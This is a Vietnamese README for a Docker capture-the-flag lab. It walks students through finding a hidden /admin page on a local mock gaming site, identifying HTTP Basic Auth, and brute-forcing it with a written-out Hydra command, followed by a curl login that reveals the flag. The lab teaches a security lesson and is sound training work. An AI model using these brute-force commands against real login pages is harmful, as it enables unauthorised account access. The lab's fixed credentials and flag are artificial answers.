
# 🎮 Lugx Fortress: Brute the Admin

## 🧩 Cốt truyện
Lugx Gaming – một trong những studio game indie phát triển nhanh nhất châu Á – vừa ra mắt cổng quản trị nội bộ của họ, đặt tên là Lugx Fortress. Theo một nguồn tin mật, hệ thống này chứa thông tin nhạy cảm về dự án game sắp ra mắt cùng với flag chứng minh bạn đã truy cập trái phép thành công.
Tuy nhiên, cánh cửa dẫn vào admin được bảo vệ bởi một lớp HTTP Basic Authentication cổ điển – không có bất kỳ giao diện đăng nhập nào, không có form, không có gợi ý.
Tất cả những gì bạn có là giao diện trang chủ bóng bẩy và một cảm giác rằng “có gì đó đang bị che giấu”.

---
## 🎯 Nhiệm vụ của bạn
- Tìm ra cánh cửa ẩn (endpoint /admin).
- Phát hiện và nhận diện HTTP Basic Auth.
- Dò tìm thông tin đăng nhập (username/password) bằng kỹ thuật brute force.
- Truy cập vào khu vực admin và thu thập flag chứng minh bạn đã “phá tường thành Lugx”.
---

## 🕵️‍♂️ Bối cảnh thêm
- Bạn là một thực tập sinh an ninh mạng, được giao nhiệm vụ kiểm thử một phiên bản staging của hệ thống Lugx trước khi đưa vào production.
- CTO của Lugx để quên hệ thống bảo mật ở mức rất cơ bản, và muốn biết: liệu chỉ một lớp HTTP Basic Auth có đủ an toàn?
- “Không có gì cần giấu” – họ nói.
- Nhưng bạn biết: mọi cánh cửa đều có chìa khóa, nếu bạn biết cách lắng nghe... hoặc brute force.
---

## 🚀 Khởi động Lab

### 1. Yêu cầu hệ thống

- Docker và Docker Compose đã được cài đặt

### 2. Khởi chạy lab

```bash
git clone <repo_url> basic-auth-lugx
cd basic-auth-lugx
docker-compose up --build
```
![image](https://github.com/user-attachments/assets/ec0db540-23e3-467f-b249-d453c77f952c)

Truy cập trình duyệt: [http://localhost:8080](http://localhost:8080)

Bạn sẽ thấy giao diện của website Lugx Gaming như một trang bán game thực thụ.

---

## 🎓 Hướng dẫn học viên

### Bước 1: Khám phá trang chính

Mở trình duyệt và truy cập vào:
```
http://localhost:8080
```
![image](https://github.com/user-attachments/assets/640b6b37-d13d-458f-bafc-3dcf9e84ca8a)

Trang web hiện ra là một trang game (Lugx Gaming) với nội dung bình thường. Nhiệm vụ của bạn là **khám phá xem có khu vực nào đang ẩn không.**

### Bước 2: Fuzz endpoint ẩn

Thử truy cập các đường dẫn phổ biến như:
```
http://localhost:8080/admin
```
![image](https://github.com/user-attachments/assets/a21656e5-4150-4369-a40f-4203e8e60dd8)

Bạn sẽ nhận được phản hồi:
```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Admin Area"
```
![image](https://github.com/user-attachments/assets/f6fb23cc-9ee2-420f-a553-db906e45b6fd)

=> Xác nhận đây là **HTTP Basic Authentication**.

### Bước 3: Brute force với Hydra
#### Giới thiệu về công cụ Hydra 
- Hydra là một trong những công cụ thường được Hacker và các nhà nghiên cứu bảo mật sử dụng. Đây công cụ có sẵn trong Kali Linux các phiên bản và được dùng để thực hiện các cuộc tấn công Brute Force Password hay còn gọi là dò mật khẩu.
#### Thực hành công cụ Hydra
Sử dụng `hydra` để brute force thông tin đăng nhập:

```bash
hydra -L wordlists/users.txt -P wordlists/passwords.txt localhost http-get /admin -s 8080
```
![image](https://github.com/user-attachments/assets/10d4baf4-aee5-4543-a262-3f812107d542)

Trong đó:
- `-L`: danh sách username
- `-P`: danh sách password
- `/admin`: endpoint được bảo vệ
- `-s 8080`: cổng dịch vụ

Kết quả sẽ trả về khi tìm được tài khoản đúng:


```
[8080][http-get] host: localhost   login: gamer   password: lugx@123
```

### Bước 4: Truy cập với thông tin đã brute force

Sau khi có được thông tin `gamer:lugx@123`, bạn có thể truy cập admin:

```bash
curl -u gamer:lugx@123 http://localhost:8080/admin
```


Kết quả:
```html
<h2>Welcome to the Admin Panel</h2>
<p>Your flag is: <code>FLAG{brute_force_success}</code></p>
```

🎉 **Bạn đã hoàn thành bài lab!**

---

## 📝 Ghi chú

- Đây là lab CTF mô phỏng thực tế. Trong thực tế, không nên sử dụng HTTP Basic Auth nếu không kết hợp HTTPS.
- Đừng quên kiểm tra source code để hiểu cách hoạt động của HTTP Auth trong Node.js/Express.

---

Happy Hacking! 🎮
